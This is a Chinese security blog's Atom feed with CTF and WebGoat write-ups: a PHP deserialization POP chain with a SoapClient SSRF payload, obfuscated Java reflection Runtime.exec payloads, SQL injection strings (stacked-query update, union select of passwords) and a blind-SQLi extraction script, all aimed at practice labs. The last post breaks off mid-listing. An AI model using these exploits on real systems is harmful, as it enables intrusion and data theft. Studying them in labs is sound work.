<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小叹</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-08-11T04:57:35.660Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/08/11/[MRCTF2020]Ezpop_Reveng/"/>
    <id>http://yoursite.com/2020/08/11/[MRCTF2020]Ezpop_Reveng/</id>
    <published>2020-08-11T04:57:35.659Z</published>
    <updated>2020-08-11T04:57:35.660Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MRCTF2020-Ezpop-Reveng"><a href="#MRCTF2020-Ezpop-Reveng" class="headerlink" title="[MRCTF2020]Ezpop_Reveng"></a>[MRCTF2020]Ezpop_Reveng</h2><p>有<a href="http://www.zip下载源码，进行全局搜索unserialize。">www.zip下载源码，进行全局搜索unserialize。</a></p><p>Plugin.php:</p><pre><code>    public function action()&#123;        if(!isset($_SESSION)) session_start();        if(isset($_REQUEST[&#39;admin&#39;])) var_dump($_SESSION);        if (isset($_POST[&#39;C0incid3nc3&#39;])) &#123;         if(preg_match(&quot;/file|assert|eval|[`\&#39;~^?&lt;&gt;$%]+/i&quot;,base64_decode($_POST[&#39;C0incid3nc3&#39;])) === 0)            unserialize(base64_decode($_POST[&#39;C0incid3nc3&#39;]));         else &#123;            echo &quot;Not that easy.&quot;;         &#125;        &#125;    &#125;&#125;</code></pre><p>上面有wake_up：</p><pre><code>class HelloWorld_DB&#123;    private $flag=&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;;    private $coincidence;    function  __wakeup()&#123;        $db = new Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;]);    &#125;&#125;</code></pre><p>跟进Typecho_Db看看：</p><pre><code>public function __construct($adapterName, $prefix = &#39;typecho_&#39;)&#123;    /** 获取适配器名称 */    $this-&gt;_adapterName = $adapterName;    /** 数据库适配器 */    $adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;    if (!call_user_func(array($adapterName, &#39;isAvailable&#39;))) &#123;        throw new Typecho_Db_Exception(&quot;Adapter &#123;$adapterName&#125; is not available&quot;);//__toString()    &#125;</code></pre><p>这里有提示toSting</p><p>跟进，在类<code>Typecho_Db_Query</code>中的<code>__toString()</code></p><pre><code>    public function __toString()    &#123;        switch ($this-&gt;_sqlPreBuild[&#39;action&#39;]) &#123;            case Typecho_Db::SELECT:                return $this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild);            case Typecho_Db::INSERT:                return &#39;INSERT INTO &#39;                . $this-&gt;_sqlPreBuild[&#39;table&#39;]                . &#39;(&#39; . implode(&#39; , &#39;, array_keys($this-&gt;_sqlPreBuild[&#39;rows&#39;])) . &#39;)&#39;                . &#39; VALUES &#39;                . &#39;(&#39; . implode(&#39; , &#39;, array_values($this-&gt;_sqlPreBuild[&#39;rows&#39;])) . &#39;)&#39;                . $this-&gt;_sqlPreBuild[&#39;limit&#39;];            case Typecho_Db::DELETE:                return &#39;DELETE FROM &#39;                . $this-&gt;_sqlPreBuild[&#39;table&#39;]                . $this-&gt;_sqlPreBuild[&#39;where&#39;];            case Typecho_Db::UPDATE:                $columns = array();                if (isset($this-&gt;_sqlPreBuild[&#39;rows&#39;])) &#123;                    foreach ($this-&gt;_sqlPreBuild[&#39;rows&#39;] as $key =&gt; $val) &#123;                        $columns[] = &quot;$key = $val&quot;;                    &#125;                &#125;                return &#39;UPDATE &#39;                . $this-&gt;_sqlPreBuild[&#39;table&#39;]                . &#39; SET &#39; . implode(&#39; , &#39;, $columns)                . $this-&gt;_sqlPreBuild[&#39;where&#39;];            default:                return NULL;        &#125;    &#125;&#125;</code></pre><p>exp:</p><pre><code>&lt;?phpclass HelloWorld_DB&#123;    private $flag=&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;;    private $coincidence;    public function __construct()    &#123;        $this-&gt;coincidence = [&#39;hello&#39;=&gt;new Typecho_Db_Query()];    &#125;&#125;class Typecho_Db_Query&#123;    private $_adapter;    private $_sqlPreBuild;    public function __construct()    &#123;        $target = &#39;http://127.0.0.1/flag.php&#39;;        $headers = array(            &#39;X-Forwarded-For: 127.0.0.1&#39;,            &#39;Cookie: PHPSESSID=11111111111111111111111111&#39;        );        $b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;HyyMbb^^&#39;.join(&#39;^^&#39;,$headers),&#39;uri&#39;      =&gt; &quot;aaab&quot;));        $this-&gt;_adapter=$b;        $this-&gt;_sqlPreBuild = [&#39;action&#39;=&gt;&#39;SELECT&#39;];    &#125;&#125;</code></pre><p>访问<code>page_admin</code>?admin=1</p><pre><code>C0incid3nc3=TzoxMzoiSGVsbG9Xb3JsZF9EQiI6MTp7UzoyNjoiXDAwSGVsbG9Xb3JsZF9EQlwwMGNvaW5jaWRlbmNlIjthOjE6e3M6NToiaGVsbG8iO086MTY6IlR5cGVjaG9fRGJfUXVlcnkiOjI6e1M6MzA6IlwwMFR5cGVjaG9fRGJfUXVlcnlcMDBfc3FsUHJlQnVpbGQiO2E6MTp7czo2OiJhY3Rpb24iO3M6NjoiU0VMRUNUIjt9UzoyNjoiXDAwVHlwZWNob19EYl9RdWVyeVwwMF9hZGFwdGVyIjtPOjEwOiJTb2FwQ2xpZW50Ijo1OntzOjM6InVyaSI7czo0OiJhYWFiIjtzOjg6ImxvY2F0aW9uIjtzOjI1OiJodHRwOi8vMTI3LjAuMC4xL2ZsYWcucGhwIjtzOjE1OiJfc3RyZWFtX2NvbnRleHQiO2k6MDtzOjExOiJfdXNlcl9hZ2VudCI7czo3OToid3VwY28NClgtRm9yd2FyZGVkLUZvcjogMTI3LjAuMC4xDQpDb29raWU6IFBIUFNFU1NJRD0xMTExMTExMTExMTExMTExMTExMTExMTExMSI7czoxMzoiX3NvYXBfdmVyc2lvbiI7aToxO319fX0=</code></pre><p>再次访问：</p><p>PHPSESSION=11111111111111111111111111</p><p>出现flag.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MRCTF2020-Ezpop-Reveng&quot;&gt;&lt;a href=&quot;#MRCTF2020-Ezpop-Reveng&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]Ezpop_Reveng&quot;&gt;&lt;/a&gt;[MRCTF2020]Ezpop_Re
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/08/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%89%EF%BC%89XXE/"/>
    <id>http://yoursite.com/2020/08/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%89%EF%BC%89XXE/</id>
    <published>2020-08-07T05:09:10.288Z</published>
    <updated>2020-08-07T05:09:10.289Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WebGoat代码审计（三）XXE"><a href="#WebGoat代码审计（三）XXE" class="headerlink" title="WebGoat代码审计（三）XXE"></a>WebGoat代码审计（三）XXE</h1><p>WebGoat采用的是Spring Boot的微服务框架。所以处理各种请求时，是通过里面的注解。</p><p><strong>查看源码文件WebGoat\webgoat-lessons\xxe\src\main\java\org\owasp\webgoat\plugin\SimpleXXE.java代码中的第53~79行，处理了我们发往/WebGoat/xxe/simple</strong> <strong>的POST 请求。</strong></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200807105423406.png" alt="image-20200807105423406"></p><p><strong>其中的类似@Xxxx</strong> <strong>的是各种注解，如：</strong> </p><p> @AssignmentPath(“xxe/simple”) 接收并处理发往xxe/simple的HTTP请求。  </p><p>@Autowired 控制如何完成自动连接或加载。  </p><p>@RequestMapping(method = POST, consumes = ALL_VALUE, produces = APPLICATION_JSON_VALUE)配置url映射。  </p><p>@ResponseBody表示该方法的返回结果直接写入 HTTP返回包的正文中。  (</p><p>@RequestBody String commentStr)表示将请求中的数据写入到commentStr这个String对象中。</p><p>在Comments.java文件做了3件事情：</p><p>1.获取一个JAXBContext的实例名为jc。</p><p>2.JAXBContext创建一个Unmarshaller对象。</p><p>3.执行unmarshaller方法得到comment。</p><p>newInstance里面传入的是一个class，也就是Comment这个类。  unmarshaller里面传入的是一个xml的字符串，也就是xml。 </p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200807112050438.png" alt="image-20200807112050438"></p><p>跟踪代码。</p><p><strong>当把xml格式的字符串传递给Unmarshaller接口转变成Java对象时，会解析一遍xml，如果传入的值可控就会导致XXE注入攻击。</strong></p><p><img src="D:%5Cblog%5Csource_posts%5Cimage-20200807112154158.png" alt="image-20200807112154158"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WebGoat代码审计（三）XXE&quot;&gt;&lt;a href=&quot;#WebGoat代码审计（三）XXE&quot; class=&quot;headerlink&quot; title=&quot;WebGoat代码审计（三）XXE&quot;&gt;&lt;/a&gt;WebGoat代码审计（三）XXE&lt;/h1&gt;&lt;p&gt;WebGoat采用的
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/08/07/Java%E5%8F%8D%E5%B0%84%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/08/07/Java%E5%8F%8D%E5%B0%84%E7%9A%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-08-07T02:06:22.958Z</published>
    <updated>2020-08-07T02:06:22.958Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java反射的学习"><a href="#Java反射的学习" class="headerlink" title="Java反射的学习"></a>Java反射的学习</h1><p>之前Java的 反射一直没弄懂，今天学习一下。</p><p>从这个简单的例子可以看出，一般情况下我们使用反射获取一个对象的步骤：</p><ul><li>获取类的 Class 对象实例</li></ul><pre><code>Class clz = Class.forName(&quot;com.zhenai.api.Apple&quot;);</code></pre><ul><li>根据 Class 对象实例获取 Constructor 对象</li></ul><pre><code>Constructor appleConstructor = clz.getConstructor();</code></pre><ul><li>使用 Constructor 对象的 newInstance 方法获取反射类对象</li></ul><pre><code>Object appleObj = appleConstructor.newInstance();</code></pre><p>而如果要调用某一个方法，则需要经过下面的步骤：</p><ul><li>获取方法的 Method 对象</li></ul><pre><code>Method setPriceMethod = clz.getMethod(&quot;setPrice&quot;, int.class);</code></pre><ul><li>利用 invoke 方法调用方法</li></ul><pre><code>setPriceMethod.invoke(appleObj, 14);</code></pre><p>下面是执行系统命令的payload：</p><pre><code>&#39;&#39;.getClass()// class java.lang.String&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;)// class java.lang.Runtime&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;ex&#39;+&#39;ec&#39;,&#39;&#39;.getClass())// public java.lang.Process java.lang.Runtime.exec(java.lang.String) throws java.io.IOException&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;getRu&#39;+&#39;ntime&#39;)// public static java.lang.Runtime java.lang.Runtime.getRuntime()&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;getRu&#39;+&#39;ntime&#39;).invoke(null)// java.lang.Runtime@c2939a&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;ex&#39;+&#39;ec&#39;,&#39;&#39;.getClass()).invoke(&#39;&#39;.getClass().forName(&#39;java.la&#39;+&#39;ng.Ru&#39;+&#39;ntime&#39;).getMethod(&#39;getRu&#39;+&#39;ntime&#39;).invoke(null),&#39;calc&#39;)// java.lang.ProcessImpl@f2f85c</code></pre><p>静下心看看还是很简单的。在网上找到了一个代码</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200807100414075.png" alt="image-20200807100414075"></p><p>通过上面的学习，将这个代码修改一下在本地运行。</p><pre><code>package forname;import java.io.IOException;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;public class MAin &#123;    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException,            InstantiationException, IOException, NoSuchMethodException, InvocationTargetException &#123;        Method method = &quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null);        Runtime run = (Runtime) method.invoke(null,null);        run.exec(&quot;calc&quot;);//        Method exec_method = &quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass());//        exec_method.invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc&quot;);//        System.out.println(&quot;&quot;.getClass());    &#125;&#125;</code></pre><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200807100513630.png" alt="image-20200807100513630"></p><p>可以看见运行成功。我们再改一下。</p><pre><code>public class MAin &#123;    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException,            InstantiationException, IOException, NoSuchMethodException, InvocationTargetException &#123;//        Method method = &quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null);//        Runtime run = (Runtime) method.invoke(null,null);//        run.exec(&quot;calc&quot;);        Method exec_method = &quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass());        exec_method.invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc&quot;);        System.out.println(&quot;&quot;.getClass());    &#125;&#125;</code></pre><p>也同样运行成功了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java反射的学习&quot;&gt;&lt;a href=&quot;#Java反射的学习&quot; class=&quot;headerlink&quot; title=&quot;Java反射的学习&quot;&gt;&lt;/a&gt;Java反射的学习&lt;/h1&gt;&lt;p&gt;之前Java的 反射一直没弄懂，今天学习一下。&lt;/p&gt;
&lt;p&gt;从这个简单的例子可以看
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/08/01/Webgoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://yoursite.com/2020/08/01/Webgoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2020-08-01T06:48:24.657Z</published>
    <updated>2020-08-01T06:48:24.657Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Webgoat代码审计（二）"><a href="#Webgoat代码审计（二）" class="headerlink" title="Webgoat代码审计（二）"></a>Webgoat代码审计（二）</h1><pre><code>protected AttackResult injectableQuery(String login_count, String accountName) &#123;    String queryString = &quot;SELECT * From user_data WHERE Login_Count = ? and userid= &quot; + accountName;    try (Connection connection = dataSource.getConnection()) &#123;        PreparedStatement query = connection.prepareStatement(queryString, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);        int count = 0;        try &#123;            count = Integer.parseInt(login_count);        &#125; catch (Exception e) &#123;            return failed(this).output(&quot;Could not parse: &quot; + login_count + &quot; to a number&quot;                    + &quot;&lt;br&gt; Your query was: &quot; + queryString.replace(&quot;?&quot;, login_count)).build();        &#125;        query.setInt(1, count);        //String query = &quot;SELECT * FROM user_data WHERE Login_Count = &quot; + login_count + &quot; and userid = &quot; + accountName, ;        try &#123;            ResultSet results = query.executeQuery();            if ((results != null) &amp;&amp; (results.first() == true)) &#123;                ResultSetMetaData resultsMetaData = results.getMetaData();                StringBuffer output = new StringBuffer();                output.append(SqlInjectionLesson5a.writeTable(results, resultsMetaData));                results.last();                // If they get back more than one user they succeeded                if (results.getRow() &gt;= 6) &#123;                    return success(this).feedback(&quot;sql-injection.5b.success&quot;).output(&quot;Your query was: &quot; + queryString.replace(&quot;?&quot;, login_count)).feedbackArgs(output.toString()).build();                &#125; else &#123;                    return failed(this).output(output.toString() + &quot;&lt;br&gt; Your query was: &quot; + queryString.replace(&quot;?&quot;, login_count)).build();                &#125;            &#125; else &#123;                return failed(this).feedback(&quot;sql-injection.5b.no.results&quot;).output(&quot;Your query was: &quot; + queryString.replace(&quot;?&quot;, login_count)).build();            &#125;        &#125; catch (SQLException sqle) &#123;            return failed(this).output(sqle.getMessage() + &quot;&lt;br&gt; Your query was: &quot; + queryString.replace(&quot;?&quot;, login_count)).build();        &#125;    &#125; catch (Exception e) &#123;        return failed(this).output(this.getClass().getName() + &quot; : &quot; + e.getMessage() + &quot;&lt;br&gt; Your query was: &quot; + queryString.replace(&quot;?&quot;, login_count)).build();    &#125;&#125;</code></pre><p>可以看见这里Login_Count的参数使用了预编译，所以对它进行注入失败了。</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200801092254377.png" alt="image-20200801092254377"></p><p>试试看对id的注入。</p><blockquote><p>1</p><p>1 or 1 =1</p></blockquote><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200801093709624.png" alt="image-20200801093709624"></p><p>可以看见注入成功了。</p><h1 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h1><p>很简单直接注入就行了。</p><pre><code>StringBuffer output = new StringBuffer();String query = &quot;SELECT * FROM employees WHERE last_name = &#39;&quot; + name + &quot;&#39; AND auth_tan = &#39;&quot; + auth_tan + &quot;&#39;&quot;;</code></pre><h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>本题使用查询链破坏完整性：<br>employee name: ’ ; update employees set salary=1000000 where last_name=‘Smith’; –<br>tan: 随便填</p><h1 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h1><h1 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h1><pre><code>String query = &quot;&quot;;try (Connection connection = dataSource.getConnection()) &#123;    boolean usedUnion = true;    query = &quot;SELECT * FROM user_data WHERE last_name = &#39;&quot; + accountName + &quot;&#39;&quot;;    //Check if Union is used    if (!accountName.matches(&quot;(?i)(^[^-/*;)]*)(\\s*)UNION(.*$)&quot;)) &#123;        usedUnion = false;    &#125;</code></pre><p>从正则可以看出要出现union</p><p>‘  union select userid,user_name,password,cookie,’5’,’6’,7 from user_system_data <em>–</em></p><p>union查询要注意到两点：一是查询列数相同；二是查询类型要兼容）</p><p>‘;select userid,user_name,password,cookie,’5’,’6’,’7’ from user_system_data –</p><h1 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h1><p>可以看见两个参数都有预编译，无法进行注入。</p><pre><code>@PostMapping(&quot;/SqlInjectionAdvanced/challenge_Login&quot;)    @ResponseBody    public AttackResult login(@RequestParam String username_login, @RequestParam String password_login) throws Exception &#123;        try (var connection = dataSource.getConnection()) &#123;            PreparedStatement statement = connection.prepareStatement(&quot;select password from sql_challenge_users where userid = ? and password = ?&quot;);            statement.setString(1, username_login);            statement.setString(2, password_login);            ResultSet resultSet = statement.executeQuery();            if (resultSet.next()) &#123;                return (&quot;tom&quot;.equals(username_login)) ? success(this).build()                        : success(this).feedback(&quot;ResultsButNotTom&quot;).build();            &#125; else &#123;                return failed(this).feedback(&quot;NoResultsMatched&quot;).build();            &#125;        &#125;    &#125;&#125;</code></pre><p>那就看看注册页面可不可以注入</p><pre><code>try (Connection connection = dataSource.getConnection()) &#123;    String checkUserQuery = &quot;select userid from sql_challenge_users where userid = &#39;&quot; + username_reg + &quot;&#39;&quot;;    Statement statement = connection.createStatement();    ResultSet resultSet = statement.executeQuery(checkUserQuery);    if (resultSet.next()) &#123;        if (username_reg.contains(&quot;tom&#39;&quot;)) &#123;            attackResult = success(this).feedback(&quot;user.exists&quot;).build();        &#125; else &#123;            attackResult = failed(this).feedback(&quot;user.exists&quot;).feedbackArgs(username_reg).build();        &#125;    &#125; else &#123;        PreparedStatement preparedStatement = connection.prepareStatement(&quot;INSERT INTO sql_challenge_users VALUES (?, ?, ?)&quot;);        preparedStatement.setString(1, username_reg);        preparedStatement.setString(2, email_reg);        preparedStatement.setString(3, password_reg);        preparedStatement.execute();        attackResult = success(this).feedback(&quot;user.created&quot;).feedbackArgs(username_reg).build();    &#125;</code></pre><p>从注册的代码可以看见虽然进行了预编译但是在前面的查询操作中是直接进行拼接的，所以存在注入点。下面是我写的脚本（写了好久，铁废物了）：</p><p><code>import requests</code></p><p><code>from string import printable</code></p><p><code>\#print(printable)</code></p><p><code>url = &quot;http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge&quot;</code></p><p><code>headers = &#123;</code></p><p>  <code>&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0&#39;,</code></p><p>  <code>&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded; charset=UTF-8&#39;,</code></p><p>  <code>&#39;X-Requested-With&#39;: &#39;XMLHttpRequest&#39;</code></p><p><code>&#125;</code></p><p><code>cookie = &#123;</code></p><p>  <code>&#39;JSESSIONID&#39;: &#39;ErbHloJmWxHtUQJ9RFopDZtBgoHiDX6hLVRsbISp&#39;</code></p><p><code>&#125;</code></p><p><code>test_data = &quot;username_reg=tom&#39;+and+substr(password,1,1)=&#39;1&#39;--+-&amp;email_reg=123456@qq.com&amp;password_reg=123456&amp;confirm_password_reg=123&quot;</code></p><p><code>proxy=&#123;&quot;http&quot;: &quot;http://127.0.0.1:8889&quot;&#125;</code></p><p><code>\# req = requests.put(url,data=test_data,headers=headers,cookies=cookie,proxies=proxy)</code></p><p><code>\# print(req.text)</code></p><p><code>\# if &#39;already exists&#39; in req.text:</code></p><p><code>\#   print(True)</code></p><p><code>i=0</code></p><p><code>text = &quot;&quot;</code></p><p><code>while True:</code></p><p>  <code>i += 1</code></p><p>  <code>temp = text</code></p><p>  <code>for char in printable:</code></p><p>​    <code>data = &quot;username_reg=tom&#39;+and+substr(password,&#123;0&#125;,1)=&#39;&#123;1&#125;&#39;--+-&amp;email_reg=123456@qq.com&amp;password_reg=123456&amp;confirm_password_reg=123&quot;.format(i,char)</code></p><p>​    <code>req = requests.put(url,data=data,headers=headers,cookies=cookie,proxies=proxy)</code></p><p>​    <code>\#print(data,req.text)</code></p><p>​    <code>if &#39;already exists&#39; in req.text:</code></p><p>​      <code>text += char</code></p><p>​      <code>print(text)</code></p><p>  <code>if temp == text:</code></p><p>​    <code>break</code></p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200801144818774.png" alt="image-20200801144818774"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Webgoat代码审计（二）&quot;&gt;&lt;a href=&quot;#Webgoat代码审计（二）&quot; class=&quot;headerlink&quot; title=&quot;Webgoat代码审计（二）&quot;&gt;&lt;/a&gt;Webgoat代码审计（二）&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;protected Atta
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/07/31/Webgoat8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2020/07/31/Webgoat8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-07-31T13:43:46.282Z</published>
    <updated>2020-07-31T13:43:46.283Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Webgoat8代码审计（一）"><a href="#Webgoat8代码审计（一）" class="headerlink" title="Webgoat8代码审计（一）"></a>Webgoat8代码审计（一）</h1><p>先看看/SqlInjection/attack2</p><pre><code>    @PostMapping(&quot;/SqlInjection/attack2&quot;)    @ResponseBody    public AttackResult completed(@RequestParam String query) &#123;        return injectableQuery(query);    &#125;    protected AttackResult injectableQuery(String query) &#123;        try (var connection = dataSource.getConnection()) &#123;            Statement statement = connection.createStatement(TYPE_SCROLL_INSENSITIVE, CONCUR_READ_ONLY);            ResultSet results = statement.executeQuery(query);            StringBuffer output = new StringBuffer();            results.first();            if (results.getString(&quot;department&quot;).equals(&quot;Marketing&quot;)) &#123;                output.append(&quot;&lt;span class=&#39;feedback-positive&#39;&gt;&quot; + query + &quot;&lt;/span&gt;&quot;);                output.append(SqlInjectionLesson8.generateTable(results));                return success(this).feedback(&quot;sql-injection.2.success&quot;).output(output.toString()).build();            &#125; else &#123;                return failed(this).feedback(&quot;sql-injection.2.failed&quot;).output(output.toString()).build();            &#125;        &#125; catch (SQLException sqle) &#123;            return failed(this).feedback(&quot;sql-injection.2.failed&quot;).output(sqle.getMessage()).build();        &#125;    &#125;&#125;</code></pre><p>可以看到这里是直接将输入的参数query执行。</p><p>less-8</p><p>页面上已经把sql语句给写下来了。</p><img src="C:\Users\ykpc\AppData\Roaming\Typora\typora-user-images\image-20200731171000534.png" alt="image-20200731171000534" style="zoom:150%;" /><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200731175604988.png" alt="image-20200731175604988"></p><p> <code>**@PostMapping**  **public**  **@ResponseBody**  AttackResult **completed**(@RequestParam String account, @RequestParam String operator, @RequestParam String injection) &#123;    **return** injectableQuery(account + &quot; &quot; + operator + &quot; &quot; + injection);  &#125;   **protected** AttackResult **injectableQuery**(String accountName) &#123;    String query = &quot;&quot;;    **try** &#123;      Connection connection = DatabaseUtilities.getConnection(getWebSession());      *//非常明显，accountName完全可控，直接丢到statement.executeQuery(query)中执行sql查询。*      query = &quot;SELECT * FROM user_data WHERE first_name = &#39;John&#39; and last_name = &#39;&quot; + accountName + &quot;&#39;&quot;;      **try**(Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,              ResultSet.CONCUR_READ_ONLY)) &#123;         ResultSet results = statement.executeQuery(query);        ......</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Webgoat8代码审计（一）&quot;&gt;&lt;a href=&quot;#Webgoat8代码审计（一）&quot; class=&quot;headerlink&quot; title=&quot;Webgoat8代码审计（一）&quot;&gt;&lt;/a&gt;Webgoat8代码审计（一）&lt;/h1&gt;&lt;p&gt;先看看/SqlInjection/a
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2020/07/31/[GYCTF2020]Node%20Game/"/>
    <id>http://yoursite.com/2020/07/31/[GYCTF2020]Node%20Game/</id>
    <published>2020-07-31T03:40:11.350Z</published>
    <updated>2020-07-31T03:40:11.350Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p>最近总是遇到Node.js的题目可是我都不会</p><p>下面是这题的源码：</p><table><thead><tr><th></th><th>var express = require(‘express’);</th></tr></thead><tbody><tr><td></td><td>var app = express();</td></tr><tr><td></td><td>var fs = require(‘fs’);</td></tr><tr><td></td><td>var path = require(‘path’);</td></tr><tr><td></td><td>var http = require(‘http’);</td></tr><tr><td></td><td>var pug = require(‘pug’);</td></tr><tr><td></td><td>var morgan = require(‘morgan’);</td></tr><tr><td></td><td>const multer = require(‘multer’);</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td>app.use(multer({dest: ‘./dist’}).array(‘file’));</td></tr><tr><td></td><td>app.use(morgan(‘short’));</td></tr><tr><td></td><td>app.use(“/uploads”,express.static(path.join(__dirname, ‘/uploads’)))</td></tr><tr><td></td><td>app.use(“/template”,express.static(path.join(__dirname, ‘/template’)))</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td>app.get(‘/‘, function(req, res) {</td></tr><tr><td></td><td>var action = req.query.action?req.query.action:”index”;</td></tr><tr><td></td><td>if( action.includes(“/“) || action.includes(“\“) ){</td></tr><tr><td></td><td>res.send(“Errrrr, You have been Blocked”);</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>file = path.join(__dirname + ‘/template/‘+ action +’.pug’);</td></tr><tr><td></td><td>var html = pug.renderFile(file);</td></tr><tr><td></td><td>res.send(html);</td></tr><tr><td></td><td>});</td></tr><tr><td></td><td></td></tr><tr><td></td><td>app.post(‘/file_upload’, function(req, res){</td></tr><tr><td></td><td>var ip = req.connection.remoteAddress;</td></tr><tr><td></td><td>var obj = {</td></tr><tr><td></td><td>msg: ‘’,</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>if (!ip.includes(‘127.0.0.1’)) {</td></tr><tr><td></td><td>obj.msg=”only admin’s ip can use it”</td></tr><tr><td></td><td>res.send(JSON.stringify(obj));</td></tr><tr><td></td><td>return</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>fs.readFile(req.files[0].path, function(err, data){</td></tr><tr><td></td><td>if(err){</td></tr><tr><td></td><td>obj.msg = ‘upload failed’;</td></tr><tr><td></td><td>res.send(JSON.stringify(obj));</td></tr><tr><td></td><td>}else{</td></tr><tr><td></td><td>var file_path = ‘/uploads/‘ + 